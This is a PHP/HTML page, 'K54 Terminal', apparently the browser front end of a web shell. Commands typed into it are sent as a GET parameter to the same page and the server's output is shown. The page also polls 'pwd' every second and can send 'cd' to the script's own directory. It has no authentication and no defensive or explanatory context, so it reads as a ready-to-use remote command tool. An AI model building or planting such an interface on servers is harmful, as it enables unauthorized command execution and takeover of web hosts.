<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>K54 Terminal</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: monospace;
            line-height: 1.5;
        }
        #terminal {
            width: 98.5%;
            height: 500px;
            overflow-y: scroll;
            border: 1px solid green;
            padding: 10px;
        }
        #currentDir {
            margin-bottom: 10px;
            font-family: monospace;
            color: cyan;
        }
        input {
            background-color: black;
            color: green;
            border: none;
            outline: none;
            width: calc(100% - 20px);
            font-family: monospace;
        }
        .command-output {
            margin-bottom: 10px;
            padding: 5px;
            border-radius: 5px;
            background-color: #222;
            overflow-x: auto; 
            word-wrap: break-word; 
        }
        #mainDirButton {
            position: fixed;
            bottom: 10px;
            right: 10px;
            padding: 5px 10px;
            background-color: green;
            color: black;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: monospace;
        }
    </style>
</head>
<body>
<div id="terminal"></div>
<div id="currentDir">terminal@K54: </div>
<input type="text" id="command" placeholder="Komut girin..." autofocus autocomplete="off">
<button id="mainDirButton">Ana Dizine Git</button>
<script>
    // Terminali güncelle
    function updateTerminal(response) {
        var outputDiv = document.createElement("div");
        outputDiv.classList.add("command-output");
        outputDiv.textContent = response;
        document.getElementById("terminal").appendChild(outputDiv);
        document.getElementById("terminal").scrollTop = document.getElementById("terminal").scrollHeight;
    }

    // Mevcut dizini güncelle
    function updateCurrentDirectory() {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var response = xhr.responseText;
                document.getElementById("currentDir").textContent = "terminal@K54: " + response.trim();
            }
        };
        xhr.open("GET", "?command=pwd", true);
        xhr.send();
    }

    // Belirli aralıklarla mevcut dizini güncelle
    setInterval(updateCurrentDirectory, 1000);

    document.getElementById("command").addEventListener("keyup", function(event) {
        if (event.key === "Enter") {
            var command = this.value;
            this.value = "";
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    var response = xhr.responseText;
                    updateTerminal(response);
                }
            };
            xhr.open("GET", "?command=" + encodeURIComponent(command), true);
            xhr.send();
        }
    });

    // "Ana Dizine Git" butonuna tıklanınca
    document.getElementById("mainDirButton").addEventListener("click", function(event) {
        event.preventDefault(); // Formun gönderilmesini engelle
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var response = xhr.responseText;
                updateTerminal(response);
            }
        };
        xhr.open("GET", "?command=cd <?php echo __DIR__; ?>", true);
        xhr.send();
    });
</script>
</body>
</html>
